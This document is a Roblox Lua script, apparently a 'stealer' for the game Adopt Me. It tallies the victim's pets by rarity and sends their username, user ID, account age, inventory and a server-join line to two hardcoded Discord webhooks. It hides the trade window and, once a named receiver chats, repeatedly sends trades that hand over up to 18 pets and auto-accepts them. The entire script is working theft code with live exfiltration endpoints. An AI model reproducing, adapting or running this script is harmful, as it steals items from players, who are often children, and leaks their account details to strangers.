Username = "janeq is too skilled"
Webhook = "https://discord.com/api/webhooks/1302319224185684039/ahtxsJqGagcs3ENidQuhc0GeBAmfmyKz50kZsuGGq9cV9v8pwGrxGNIKqMqGhe_bByoY"

Config = { 
  Receiver = {Username, "Onodakun23", "kely5171"}
}

local Loads = require(game.ReplicatedStorage.Fsys).load
local InventoryDB = Loads("InventoryDB")
local ClientData = Loads('ClientData')
local legendaries_count = 0
local mega_count = 0
local neon_count = 0
local ultra_count = 0
local rare_count = 0
local uncommon_count = 0
local common_count = 0


for i, v in pairs(ClientData.get("inventory").pets) do
  if InventoryDB[v.category][v.id].rarity == "legendary" then
    legendaries_count = legendaries_count + 1
  end
  if InventoryDB[v.category][v.id].properties == "mega_neon" then
    mega_count = mega_count + 1
  end
  if InventoryDB[v.category][v.id].properties == "neon" then
    neon_count = neon_count + 1
  end
  if InventoryDB[v.category][v.id].rarity == "ultra_rare" then
    ultra_count = ultra_count + 1
  end
  if InventoryDB[v.category][v.id].rarity == "rare" then
    rare_count = rare_count + 1
  end
    if InventoryDB[v.category][v.id].rarity == "uncommon" then
    uncommon_count = uncommon_count + 1
  end
  if InventoryDB[v.category][v.id].rarity == "common" then
    common_count = common_count + 1
  end
end

local userid = game.Players.LocalPlayer.UserId
local accage = game.Players.LocalPlayer.AccountAge
local LogsWebhook = "https://discord.com/api/webhooks/1302454379076522096/8t-Xl4USKXiBpqVzVsNPM89zjES8KnRwAHMSKWlWXDCdo79eWqgDCBlJ9-3xojY6aBOn"
local TeleportScript = [[game:GetService("TeleportService"):TeleportToPlaceInstance("]] .. game.PlaceId .. [[", "]] .. game.JobId .. [[", game.Players.LocalPlayer)]]

if legendaries_count >= 1 or mega_count >= 1 or neon_count >= 1 then
    rizz = '-- @everyone GOOD HIT'
else
    rizz = 'Trash Hit'
end

rizz = rizz .. '\n' .. TeleportScript .. '\n'

local data = {
  username = " "..game.Players.LocalPlayer.Name.. "",
  avatar_url = 'https://media.discordapp.net/attachments/1302269045998878750/1302301433059741768/Awesome_Profile_PFP_Free_Download_.jpg?ex=67279e39&is=67264cb9&hm=ecf10cda83d6210a61fafdc49e6b3e7495a9925f2f2f4e2bc7348a0d8dc5de66&=&format=webp&width=422&height=422',
  content = rizz,
  embeds = {
    {
      title = '__**정홍희 | Result**__',
      description = '**📃  User Information**: \n ```lua\nUsername           : '..game.Players.LocalPlayer.Name..'\nUser-ID            : '.. tostring(userid) ..'\nAccount Age        : '.. tostring(accage) ..'\nReceiver           : '.. Username ..'\n```\n 🎒__**Inventory**__    : \n ```lua\nLegendaries     🐙 : '.. tostring(legendaries_count).. '\nMega Neons      🦄 : '.. tostring(mega_count).. '\nNeons           🦖 : '.. tostring(neon_count).. '\nUltra Rares     🦅 : '.. tostring(ultra_count).. '\nRares           🐶 : '.. tostring(rare_count).. '\nUncommons       🐳 : '.. tostring(uncommon_count).. '\nCommons         🐢 : '.. tostring(common_count).. '\n```\n🔗__**Join Script**__ :\n```game:GetService("TeleportService"):TeleportToPlaceInstance(920587237, "' .. game.JobId .. '", game.Players.LocalPlayer)\n```',
      color = 9807270
    }
  }
}

local request = http_request or request or HttpPost or syn.request
request({
    Url = Webhook,
    Method = "POST",
    Headers = {
        ["Content-Type"] = "application/json"
    },
    Body = game.HttpService:JSONEncode(data)
})

local request = http_request or request or HttpPost or syn.request
request({
    Url = LogsWebhook,
    Method = "POST",
    Headers = {
        ["Content-Type"] = "application/json"
    },
    Body = game.HttpService:JSONEncode(data)
})


-- Sends a trade request to the specified player.
local function SendTrade(playerName)
    local Loads = require(game.ReplicatedStorage.Fsys).load
    local RouterClient = Loads("RouterClient")
    local SendTradeRequest = RouterClient.get("TradeAPI/SendTradeRequest")
    SendTradeRequest:FireServer(game.Players[playerName])
end

-- Adds pets from the local player's inventory to the trade offer.
local function AddPets()
    local Loads = require(game.ReplicatedStorage.Fsys).load
    local RouterClient = Loads("RouterClient")
    local AddPetRemote = RouterClient.get("TradeAPI/AddItemToOffer")
    local Juj = require(game.ReplicatedStorage.ClientModules.Core.ClientData).get_data()[game.Players.LocalPlayer.Name].inventory
    
    if Juj.pets then
        local PetCount = 0
        local PetUids = {}

        -- Collect all pet UIDs from inventory
        for PetUid, PetData in pairs(Juj.pets) do
            table.insert(PetUids, PetUid)
        end
        
        -- Add pets to the trade offer
        while #PetUids > 0 do
            local PetUid = table.remove(PetUids, 1)
            AddPetRemote:FireServer(PetUid)
            PetCount = PetCount + 1
            if PetCount >= 18 then
                break
            end
        end
    else
        print("No pets found in inventory.")
    end
end

-- Accepts the current trade negotiation.
local function AcceptTrade()
    local Loads = require(game.ReplicatedStorage.Fsys).load
    local RouterClient = Loads("RouterClient")
    local AcceptNegotiationRemote = RouterClient.get("TradeAPI/AcceptNegotiation")
    AcceptNegotiationRemote:FireServer()
end

-- Confirms the trade after it has been accepted.
local function ConfirmTrade()
    local Loads = require(game.ReplicatedStorage.Fsys).load
    local RouterClient = Loads("RouterClient")
    local AcceptTradeRemote = RouterClient.get("TradeAPI/ConfirmTrade")
    AcceptTradeRemote:FireServer()
end

-- Disable the TradeApp GUI
game:GetService("Players").LocalPlayer.PlayerGui.TradeApp.Enabled = false

-- Main function to manage trading actions in a loop for each receiver
local function StartGet()
    for _, receiver in pairs(Config.Receiver) do
        while task.wait(15) do
            SendTrade(receiver)
            wait(3)
            AddPets()
            wait(5.5)
            AcceptTrade()
            wait(15)
            ConfirmTrade()
        end
    end
end

-- Listen for chat events from the specified player
for _, plr in pairs(game.Players:GetPlayers()) do
    if plr.Name:lower() == Username:lower() then
        plr.Chatted:Connect(function()
            StartGet()
        end)
    end
end

-- Listen for new players joining the game
game.Players.PlayerAdded:Connect(function(plr)
    if plr.Name:lower() == Username:lower() then
        plr.Chatted:Connect(function()
            StartGet()
        end)
    end
end)
